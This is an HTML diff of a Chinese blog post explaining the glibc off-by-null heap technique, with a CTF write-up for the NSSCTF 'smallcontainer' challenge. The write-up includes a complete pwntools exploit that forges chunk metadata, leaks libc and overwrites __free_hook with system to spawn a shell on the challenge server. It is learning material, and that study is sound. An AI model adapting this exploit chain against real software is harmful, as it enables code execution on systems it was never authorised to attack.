@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>off by null | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">off by null</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 3, 2024&nbsp;&nbsp;20:21:52</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="off-by-null介绍"><a href="#off-by-null介绍" class="headerlink" title="off by null介绍"></a>off by null介绍</h1><p>类似于off by one不过只能溢出一个空字节，主要是让堆块的prev_inuse位(P位)位0，从而认为上一个堆块被free从而触发unlink</p>
+<h2 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>合并之后主要利用堆块重叠进行攻击</p>
+<p>prev_inuse位和size of previous chunk位在多数libc版本下在chunk在fastbin和tcache中不会出现</p>
+<h1 id="利用-off-by-null"><a href="#利用-off-by-null" class="headerlink" title="利用 off by null"></a>利用 off by null</h1><p>首先创建四个chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk 1</span><br><span class="line">chunk 2 #利用 off by null的chunk</span><br><span class="line">chunk 3</span><br><span class="line">chunk 4 #防止和topchunk合并</span><br></pre></td></tr></table></figure>
+
+<p>首先释放chunk1，填充chunk2，让chunk3中的prev_inuse位为0，改变chunk3中size of previous chunk位为size of chunk1 + size of chunk2，之后释放chunk3，即可把chunk1、chunk2、chunk3合并成一个堆，但此时chunk2并没有被释放，因此可以进行后续double free等利用。</p>
+<p>注意 chunk1，chunk3不能进入fastbin和tcache中</p>
+<p>若利用 off by null时改变了chunk3 的size位，会导致chunk3+size时找不到prev_inuse位，造成报错，因此有时需要伪造chunk3的nextchunk的prev_inuse位。</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2513">巅峰极客 2022]smallcontainer | NSSCTF</a></p>
+<p>glibc版本 2.27-3ubuntu1.5_amd64</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>add show edit delete功能齐全，且无UAF</p>
+<p>add大小限制至少为0xff,不超过0x3ff</p>
+<p><img src="/../image/off_by_null/1.png" alt="1"></p>
+<p>edit完成后会堆chunk进行检查，check函数如下</p>
+<p><img src="/../image/off_by_null/2.png" alt="2"></p>
+<p>检查会遇到0截断，不会遇到chunk边界停止，也就是说只要没有0会一直检查到下一个chunk，若下一个chunk大小为0x110、0x210等算上p位则会位0x111、0x211，被检查完后会变成0x100、0x200</p>
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>先创建三个chunk，注意第一个大小要最终位0x200。之后把0x200的tcache填满，利用off by null把第三个的prev_inuse位置0，同时改变了size位。再次edit改变size of previous chunk位</p>
+<p>由于size位被修改减少了0x10导致找不到下一个位，因此要用edit伪造一个P位</p>
+<p>之后释放堆块造成重叠，利用freehook获得shell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc6_2.35-0ubuntu3.6_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc6_2.27-3ubuntu1.4_amd64.so&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn_tools/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28940</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">   <span class="comment"># r.sendlineafter(b&#x27;Index: &#x27;, str(idx))</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">add(<span class="number">0x208</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#填满tcache</span></span><br><span class="line">    add(<span class="number">0x1f8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">4</span>+i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x1f8</span>)<span class="comment">#利用check改变p位</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x400</span>))<span class="comment">#伪造size of previous chunk</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x11</span>))<span class="comment">#改变了size 去伪造nextchunk的p位</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#取出tcache，切割unsortedbin让unsortedbin的fd和bk改到1号位置</span></span><br><span class="line">    add(<span class="number">0x1f0</span>)</span><br><span class="line"><span class="comment">#下面利用freehook</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">addr=<span class="string">b&#x27;0x&#x27;</span>+r.recvuntil(<span class="string">&quot;a0&quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(addr,<span class="number">16</span>)-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hook=addr+libc.sym.__free_hook</span><br><span class="line">sys=addr+libc.sym.system</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook))</span><br><span class="line">edit(<span class="number">1</span>,p64(hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(sys))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/08/28/house-of-botcake-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80/">house of botcake + _IO_2_1_stdout_泄露栈地址</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
